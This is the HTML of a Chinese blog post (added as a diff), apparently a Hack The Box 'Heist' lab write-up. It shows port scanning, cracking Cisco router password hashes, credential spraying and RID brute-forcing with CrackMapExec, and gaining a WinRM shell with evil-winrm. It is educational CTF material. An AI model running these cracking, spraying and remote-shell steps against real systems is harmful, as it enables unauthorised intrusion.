@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="htb heist writeup"><meta name="keywords" content="sec|secruity|blog"><link rel="alternate" href="/atom.xml" title="danta"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.1">
+<link rel="canonical" href="https://cxliker.github.io/2019/12/11/htb-heist/">
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.1">
+
+<script id="baidu_analytics">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1fb3396bc01d62b8be6fcb651441065c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script src="//cdn1.lncld.net/static/js/3.1.1/av-min.js"></script>
+  <script id="leancloud">
+    AV.init({
+      appId: "92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz",
+      appKey: "gAPpmDXQmTGE9s9a3eU4nJ0h"
+    });
+  </script><script>
+  window.config = {"leancloud":{"app_id":"92CcA9DvqYFSomQnzdApeHt9-gzGzoHsz","app_key":"gAPpmDXQmTGE9s9a3eU4nJ0h"},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>htb heist writeup - danta</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">danta</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/archives/">
+        <li class="mobile-menu-item">归档
+          </li>
+      </a><a href="/about">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a><a href="/atom.xml">
+        <li class="mobile-menu-item">RSS
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">danta</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            归档
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about">
+            关于
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/atom.xml">
+            RSS
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">htb heist writeup
+        </h1>
+
+      <div class="post-meta">
+        <span class="author">
+          danta
+        </span>
+        <span class="post-time">
+          2019-12-11 22:56
+        </span><span class="post-visits" data-url="/2019/12/11/htb-heist/" data-title="htb heist writeup">
+          阅读次数 0
+        </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Get-Shell"><span class="toc-text">Get Shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一篇writeup，靶机是来自hackthebox的<a href="https://www.hackthebox.eu/home/machines/profile/201" target="_blank" rel="noopener">heist</a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap扫一下端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p- -sV -sC -sS 10.10.10.149</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-11 09:53 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.149</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 65530 filtered ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 38s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2019-12-11T15:58:12</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 3906.87 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>主机上开着Web服务，打开是一个登录页面。页面上有个以游客访问的功能，可以看到里面有人上传的一个配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line">enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91</span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization exec SSH</span><br><span class="line"> transport input ssh</span><br></pre></td></tr></table></figure>
+
+<p>从配置文件中可以得到几个账号密码：</p>
+<table>
+<thead>
+<tr>
+<th>账号</th>
+<th>密码</th>
+<th align="left">加密类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>???</td>
+<td>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</td>
+<td align="left">Type 5</td>
+</tr>
+<tr>
+<td>rout3r</td>
+<td>0242114B0E143F015F5D1E161713</td>
+<td align="left">Type 7</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>02375012182C1A1D751618034F36415408</td>
+<td align="left">Type 7</td>
+</tr>
+</tbody></table>
+<p>结合网页描述来看这是一个思科路由器的配置文件，但是很明显都是以上经过加密的密码。查了一下Type 7是可以直接解密的，但是Type 5就没有那么容易了，只能爆破。</p>
+<p>对于Type 7直接用<a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">在线的解密工具</a>（当然这个网站可以解密Type 5的，但是耗时多），得到两个密码<code>$uperP@ssword</code>，<code>Q4)sJu\Y8qz*A3?d</code></p>
+<p>对于Type 5的我就直接用john（<a href="https://klionsec.github.io/2017/04/26/use-john/" target="_blank" rel="noopener">相关文章</a>）来解密了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  heist  cat hash.txt</span><br><span class="line"><span class="variable">$1</span><span class="variable">$pdQG</span><span class="variable">$o8nrSzsGXeaduXrjlvKc91</span></span><br><span class="line">➜  heist  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"md5crypt"</span>, but the string is also recognized as <span class="string">"md5crypt-long"</span></span><br><span class="line">Use the <span class="string">"--format=md5crypt-long"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br><span class="line">➜  heist  john hash.txt --show</span><br><span class="line">?:stealth1agent</span><br></pre></td></tr></table></figure>
+
+<p>得到一个密码：<code>stealth1agent</code> 。但对应的账号名是不清楚的，看了网上的文章都猜测是这个附件的上传者<code>Hazard</code>。</p>
+<h1 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h1><p>我知道服务器上开了smb（445端口）和winrm（5985端口）两个服务，都可以远程连接。</p>
+<p>尝试使用smb匿名登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali ~/Code/htb/heist <span class="comment"># smbmap -H 10.10.10.149</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">root@kali ~/Code/htb/heist <span class="comment"># smbclient -N -L 10.10.10.149</span></span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>
+
+<p>没有权限。那只能用刚刚解密的账号密码试试了。使用<a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials" target="_blank" rel="noopener">CrackMapExec</a>来进行爆破（成功了就会停止，可以使用<code>--continue-on-success</code>继续爆破）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># crackmapexec smb 10.10.10.149 -u users -p passwords</span></span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SUPPORTDESK)</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:stealth1agent STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:<span class="variable">$uperP</span>@ssword STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:stealth1agent STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:<span class="variable">$uperP</span>@ssword STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [-] SUPPORTDESK\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE</span><br><span class="line">CME          10.10.10.149:445 SUPPORTDESK     [+] SUPPORTDESK\hazard:stealth1agent</span><br></pre></td></tr></table></figure>
+
+<p>获得正确的账号密码：hazard/stealth1agent</p>
+<p>但是同样的尝试登录winrm却不成功，说明这个账号没有登录winrm的权限，应该还有别的账号密码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># crackmapexec winrm -u users -p passwords</span></span><br><span class="line">[*] KTHXBYE!</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>smbmap</code>用刚刚得到的账号密码进行登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span></span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session established on 10.10.10.149...</span><br><span class="line">[+] IP: 10.10.10.149:445	Name: 10.10.10.149</span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	.</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown</span><br><span class="line">	fr--r--r--                4 Sun Dec 31 19:03:58 1600	lsass</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ntsvcs</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-378-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1e8-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-448-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-5ec-0</span><br><span class="line">	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	spoolss</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-a10-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	trkwks</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-288-0</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	vgauth-service</span><br><span class="line">	fr--r--r--                4 Sun Dec 31 19:03:58 1600	srvsvc</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-278-0</span><br><span class="line">	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ROUTER</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	gecko-crash-server-pipe.5428</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.0.190032358</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.1.96034004</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.2.10178136</span><br><span class="line">	fr--r--r--                1 Sun Dec 31 19:03:58 1600	chrome.5428.3.201281206</span><br><span class="line">	.............(省略很多chrome)</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br></pre></td></tr></table></figure>
+
+<p>其中IPC$（<a href="http://smallvoid.com/article/winnt-ipc-share.html" target="_blank" rel="noopener">文档</a>，<a href="https://www.cnblogs.com/backlion/p/7401609.html" target="_blank" rel="noopener">相关</a>）通过RPC实现，文档说可以查看所有的共享文件、用户等等功能。事不宜迟，马上用RPC连接一波。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">heist <span class="comment"># rpcclient -U 'hazard%stealth1agent' 10.10.10.149</span></span><br><span class="line">rpcclient $&gt; lookupnames hazard</span><br><span class="line">hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)</span><br><span class="line">rpcclient $&gt; lookupnames administrator</span><br><span class="line">administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)</span><br></pre></td></tr></table></figure>
+
+<p>一个用户有一个对应的SID，SID有几部分组成，对于一个计算机上的SID，不同用户只有最后一部分不一样，这一部分叫做RID，用来标志不同的用户（上面的命令返回也可以看到两个账号的sid只有最后不一样）。rpc命令中可以通过sid查询用户名，所以可以自己写个脚本遍历rid来获得账号。当然还可以用工具啦。还是使用刚刚的CrackMapExec，带上参数<code>--rid-brute</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(CrackMapExec) CrackMapExec[master] <span class="comment"># cme smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute</span></span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SUPPORTDESK) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      [+] SUPPORTDESK\hazard:stealth1agent</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)</span><br></pre></td></tr></table></figure>
+
+<p>得到三个新的用户<code>support</code>、<code>Chase</code>、<code>Jason</code>。再尝试登录一边，可以得到正确的账号密码：chase / ‘Q4)sJu\Y8qz*A3?d</p>
+<p>这时再用这个账号试试登录winrm。使用<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">evil-winrm</a>工具Get Shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.0</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Documents&gt; whoami</span><br><span class="line">supportdesk\chase</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Documents&gt; <span class="built_in">cd</span> ..\Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; cat user.txt</span><br><span class="line">a127d***********</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1>
+      </div>
+      <footer class="post-footer">
+        
+        <nav class="post-nav"><a class="next" href="/2019/08/21/the-problem-about-fortigate-ssl-vpn-CVE-2018-13379/">
+        <span class="next-text nav-default">关于fortigate ssl vpn CVE-2018-13379的一些问题</span>
+        <span class="prev-text nav-mobile">下一篇</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"><div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:cxliker@qq.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/cxliker" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://hexo.io/">Hexo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2018 - 2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">danta</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://cxliker.github.io/2019/12/11/htb-heist/';
+        this.page.identifier = '2019/12/11/htb-heist/';
+        this.page.title = 'htb heist writeup';
+    };
+    (function() {
+    var d = document, s = d.createElement('script');
+
+    s.src = '//cxliker.disqus.com/embed.js';
+
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();  
+  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.1"></script>
+</body>
+</html>
